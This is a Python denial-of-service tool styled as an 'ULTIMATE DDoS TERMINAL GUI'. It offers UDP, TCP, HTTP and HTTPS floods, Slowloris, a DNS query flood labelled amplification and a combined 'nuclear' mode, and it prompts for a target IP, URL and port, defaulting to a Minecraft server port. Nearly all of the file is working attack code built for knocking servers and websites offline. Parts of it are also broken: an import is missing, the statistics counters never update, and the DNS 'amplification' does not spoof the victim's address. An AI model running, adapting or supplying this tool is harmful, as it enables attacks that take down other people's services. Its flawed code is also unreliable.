#!/usr/bin/env python3
import socket
import threading
import random
import time
import ssl
import json
import sys
import os
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from rich.progress import Progress, BarColumn, SpinnerColumn
from rich.table import Table
from rich.style import Style
from rich.text import Text
from rich.layout import Layout
import requests
from fake_useragent import UserAgent
from colorama import Fore, Back, Style as ColoramaStyle
import dns.resolver
import asyncio
import aiohttp

# ===== CONFIG ===== #
MAX_THREADS = 5000  # Increased max threads
UDP_PACKET_SIZE = 65507
TCP_PACKET_SIZE = 4096
HTTP_TIMEOUT = 3
SSL_TIMEOUT = 3
DNS_TIMEOUT = 3
CONNECTION_TIMEOUT = 5

# ===== STYLES ===== #
console = Console()
error_style = Style(color="red", bold=True)
success_style = Style(color="green", bold=True)
warning_style = Style(color="yellow", bold=True)
info_style = Style(color="cyan", bold=True)
scary_style = Style(color="#ff0000", blink=True, bold=True)

# Global stop event
stop_event = threading.Event()

# ===== SCARY BANNER ===== #
def show_banner():
    banner = Text("""
 █████╗ ███╗   ██╗ █████╗ ███████╗ ██████╗  ██████╗ 
██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔═══██╗
███████║██╔██╗ ██║███████║███████╗██║   ██║██║   ██║
██╔══██║██║╚██╗██║██╔══██║╚════██║██║   ██║██║   ██║
██║  ██║██║ ╚████║██║  ██║███████║╚██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ 
""", style=scary_style)
    
    subtitle = Text("ULTIMATE DDoS TERMINAL GUI v2.0", style="bold red on black")
    console.print(Panel(banner, 
                       title="[blink]🔥 NUKER MODE ACTIVATED 🔥[/]", 
                       subtitle=subtitle, 
                       style="bold red"))

# ===== MAIN MENU ===== #
def show_menu():
    table = Table(title="[bold red]SELECT ATTACK TYPE", show_header=True, header_style="bold white on red")
    table.add_column("Option", style="bold magenta")
    table.add_column("Attack Type", style="bold cyan")
    table.add_column("Power Level", style="bold yellow")
    table.add_row("1", "UDP FLOOD", "💀 EXTREME (Best for Minecraft/PocketMine)")
    table.add_row("2", "HTTP FLOOD", "🔥 HIGH (Best for Websites)")
    table.add_row("3", "TCP FLOOD", "☠️ BRUTAL (Best for Servers)")
    table.add_row("4", "HTTPS FLOOD", "🔒 SSL/TLS Attack")
    table.add_row("5", "SLOWLORIS", "🐢 Slow HTTP Attack")
    table.add_row("6", "DNS AMPLIFICATION", "📡 DNS Reflection Attack")
    table.add_row("7", "MIXED ATTACK", "☢️ NUCLEAR (All attacks combined)")
    console.print(table)

# ===== ATTACK FUNCTIONS ===== #
def udp_flood(target_ip, target_port, duration, threads, packet_size):
    console.print(f"[bold red]🚀 LAUNCHING UDP FLOOD ON {target_ip}:{target_port}", style="on black")
    packets_sent = 0
    failed = 0
    
    def attack():
        nonlocal packets_sent, failed
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(packet_size)
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Send multiple packets per iteration
                for _ in range(5):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    sock.sendto(data, (target_ip, target_port))
                    packets_sent += 1
            except Exception as e:
                failed += 1
                try:
                    sock.close()
                except:
                    pass
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    launch_attack(attack, threads, duration, "UDP", packets_sent, failed)

def http_flood(target_url, duration, threads):
    console.print(f"[bold red]🔥 LAUNCHING HTTP FLOOD ON {target_url}", style="on black")
    requests_sent = 0
    failed = 0
    
    # Initialize UserAgent
    ua = UserAgent()
    
    def attack():
        nonlocal requests_sent, failed
        session = requests.Session()
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": ua.random,
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                
                # Randomize request type
                if random.random() > 0.7:
                    session.post(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                else:
                    session.get(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                
                requests_sent += 1
                
                # Additional requests
                for _ in range(3):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    session.get(target_url, headers=headers, timeout=HTTP_TIMEOUT)
                    requests_sent += 1
            except:
                failed += 1
                try:
                    session.close()
                except:
                    pass
                session = requests.Session()
    
    launch_attack(attack, threads, duration, "HTTP", requests_sent, failed)

def tcp_flood(target_ip, target_port, duration, threads, packet_size):
    console.print(f"[bold red]☠️ LAUNCHING TCP FLOOD ON {target_ip}:{target_port}", style="on black")
    packets_sent = 0
    failed = 0
    
    def attack():
        nonlocal packets_sent, failed
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                
                # Send multiple packets per connection
                for _ in range(10):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    s.sendall(random._urandom(packet_size))
                    packets_sent += 1
                
                s.close()
            except:
                failed += 1
                try:
                    s.close()
                except:
                    pass
    
    launch_attack(attack, threads, duration, "TCP", packets_sent, failed)

def https_flood(target_url, duration, threads):
    console.print(f"[bold red]🔒 LAUNCHING HTTPS FLOOD ON {target_url}", style="on black")
    requests_sent = 0
    failed = 0
    
    # Initialize UserAgent
    ua = UserAgent()
    
    def attack():
        nonlocal requests_sent, failed
        session = requests.Session()
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                headers = {
                    "User-Agent": ua.random,
                    "Accept": "text/html,application/xhtml+xml",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                
                # Create SSL context for more secure connections
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # Randomize request type
                if random.random() > 0.7:
                    session.post(target_url, headers=headers, timeout=HTTP_TIMEOUT, verify=False)
                else:
                    session.get(target_url, headers=headers, timeout=HTTP_TIMEOUT, verify=False)
                
                requests_sent += 1
                
                # Additional requests
                for _ in range(3):
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    session.get(target_url, headers=headers, timeout=HTTP_TIMEOUT, verify=False)
                    requests_sent += 1
            except:
                failed += 1
                try:
                    session.close()
                except:
                    pass
                session = requests.Session()
    
    launch_attack(attack, threads, duration, "HTTPS", requests_sent, failed)

def slowloris(target_url, duration, threads):
    console.print(f"[bold red]🐢 LAUNCHING SLOWLORIS ATTACK ON {target_url}", style="on black")
    connections = 0
    failed = 0
    
    def attack():
        nonlocal connections, failed
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Parse URL
                if not target_url.startswith('http'):
                    url = 'http://' + target_url
                else:
                    url = target_url
                
                host = url.split('/')[2]
                
                # Create partial HTTP request
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(CONNECTION_TIMEOUT)
                
                if url.startswith('https'):
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=host)
                
                s.connect((host, 443 if url.startswith('https') else 80))
                
                # Send partial headers
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                s.send(f"User-Agent: {UserAgent().random}\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                connections += 1
                
                # Keep connection alive
                while time.time() < end_time and not stop_event.is_set():
                    try:
                        s.send("X-a: b\r\n".encode())
                        time.sleep(10)
                    except:
                        break
                
                s.close()
            except:
                failed += 1
                try:
                    s.close()
                except:
                    pass
    
    launch_attack(attack, threads, duration, "SLOWLORIS", connections, failed)

def dns_amplification(target_dns, duration, threads):
    console.print(f"[bold red]📡 LAUNCHING DNS AMPLIFICATION ON {target_dns}", style="on black")
    packets_sent = 0
    failed = 0
    
    # List of open DNS resolvers for amplification
    dns_servers = [
        '8.8.8.8',      # Google DNS
        '1.1.1.1',      # Cloudflare DNS
        '9.9.9.9',      # Quad9 DNS
        '208.67.222.222', # OpenDNS
        '64.6.64.6',    # Verisign DNS
    ]
    
    def attack():
        nonlocal packets_sent, failed
        end_time = time.time() + duration
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                # Create DNS query (ANY type for maximum amplification)
                dns_query = bytearray()
                # Transaction ID
                dns_query.extend(os.urandom(2))
                # Flags (Standard query)
                dns_query.extend(b'\x01\x00')
                # Questions = 1
                dns_query.extend(b'\x00\x01')
                # Answer RRs = 0
                dns_query.extend(b'\x00\x00')
                # Authority RRs = 0
                dns_query.extend(b'\x00\x00')
                # Additional RRs = 0
                dns_query.extend(b'\x00\x00')
                # Query name (target domain)
                for part in target_dns.split('.'):
                    dns_query.append(len(part))
                    dns_query.extend(part.encode())
                # Null terminator
                dns_query.append(0)
                # Query type (ANY = 255)
                dns_query.extend(b'\x00\xff')
                # Query class (IN = 1)
                dns_query.extend(b'\x00\x01')
                
                # Send to multiple DNS servers
                for server in dns_servers:
                    if time.time() >= end_time or stop_event.is_set():
                        break
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(dns_query, (server, 53))
                    packets_sent += 1
                    sock.close()
            except:
                failed += 1
    
    launch_attack(attack, threads, duration, "DNS AMP", packets_sent, failed)

# ===== ATTACK LAUNCHER ===== #
def launch_attack(attack_func, threads, duration, attack_name, success_counter, fail_counter):
    global stop_event
    stop_event = threading.Event()
    
    # Limit threads to prevent system crash
    threads = min(threads, MAX_THREADS)
    
    # Create layout for stats
    layout = Layout()
    layout.split_column(
        Layout(name="progress", size=3),
        Layout(name="stats", size=3),
        Layout(name="log", size=10)
    )
    
    with Progress(
        SpinnerColumn(style="red"),
        "[progress.description]{task.description}",
        BarColumn(bar_width=40, style="red"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task(f"[red]💀 {attack_name} ATTACK IN PROGRESS...", total=duration)
        
        # Start attack threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Update progress bar and stats
        start_time = time.time()
        while time.time() - start_time < duration and not stop_event.is_set():
            time.sleep(0.1)
            progress.update(task, advance=0.1)
            
            # Update stats
            console.print(f"[bold cyan]Requests: [green]{success_counter}[/] | [red]Failed: {fail_counter}[/] | [yellow]Threads: {threads}[/]")
        
        stop_event.set()
        for t in thread_list:
            t.join(timeout=1)
    
    console.print(f"[bold green]✅ ATTACK COMPLETED![/]", style="on black")
    console.print(f"[bold white]Total Requests: [green]{success_counter}[/] | [red]Failed: {fail_counter}[/]")

# ===== MAIN FUNCTION ===== #
def main():
    show_banner()
    show_menu()
    
    choice = Prompt.ask("[bold red]SELECT ATTACK (1-7)", choices=["1", "2", "3", "4", "5", "6", "7"])
    
    if choice in ["1", "3", "4", "5", "7"]:  # Attacks needing IP
        target_ip = Prompt.ask("[bold cyan]TARGET IP/DOMAIN")
    
    if choice in ["1", "3", "7"]:  # Attacks needing port
        target_port = IntPrompt.ask("[bold magenta]TARGET PORT", default=19132 if choice == "1" else 80)
    
    if choice in ["2", "4", "5", "7"]:  # Attacks needing URL
        target_url = Prompt.ask("[bold cyan]TARGET URL (with http:// or https://)", 
                              default="http://" + (target_ip if 'target_ip' in locals() else "example.com"))
    
    if choice == "6":  # DNS Amplification
        target_dns = Prompt.ask("[bold cyan]TARGET DOMAIN FOR DNS AMPLIFICATION")
    
    duration = IntPrompt.ask("[bold yellow]ATTACK DURATION (SECONDS)", default=60)
    threads = IntPrompt.ask("[bold green]THREAD COUNT (More = Powerful)", default=500)
    
    # Advanced options
    if choice in ["1", "3"]:
        packet_size = IntPrompt.ask("[bold magenta]PACKET SIZE (Bytes)", 
                                  default=UDP_PACKET_SIZE if choice == "1" else TCP_PACKET_SIZE)
    
    console.print("[bold red]🚀 INITIATING ATTACK SEQUENCE...", style="on black")
    
    # Launch selected attack
    if choice == "1":  # UDP
        udp_flood(target_ip, target_port, duration, threads, packet_size)
    elif choice == "2":  # HTTP
        http_flood(target_url, duration, threads)
    elif choice == "3":  # TCP
        tcp_flood(target_ip, target_port, duration, threads, packet_size)
    elif choice == "4":  # HTTPS
        https_flood(target_url, duration, threads)
    elif choice == "5":  # SLOWLORIS
        slowloris(target_url, duration, threads)
    elif choice == "6":  # DNS AMPLIFICATION
        dns_amplification(target_dns, duration, threads)
    elif choice == "7":  # MIXED
        console.print("[bold red]☢️ LAUNCHING NUCLEAR MIXED ATTACK!", style="on black")
        
        # Start all attacks simultaneously
        t1 = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, threads//4, UDP_PACKET_SIZE))
        t2 = threading.Thread(target=http_flood, args=(target_url, duration, threads//4))
        t3 = threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration, threads//4, TCP_PACKET_SIZE))
        t4 = threading.Thread(target=https_flood, args=(target_url, duration, threads//4))
        
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        
        t1.join()
        t2.join()
        t3.join()
        t4.join()
    
    console.print("[blink bold red]💀 ATTACK FINISHED! TARGET SHOULD BE DOWN![/]")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]ATTACK STOPPED BY USER!", style="on black")
        stop_event.set()
        sys.exit(0)
    except Exception as e:
        console.print(f"[bold red]ERROR: {str(e)}", style="on black")
        sys.exit(1)
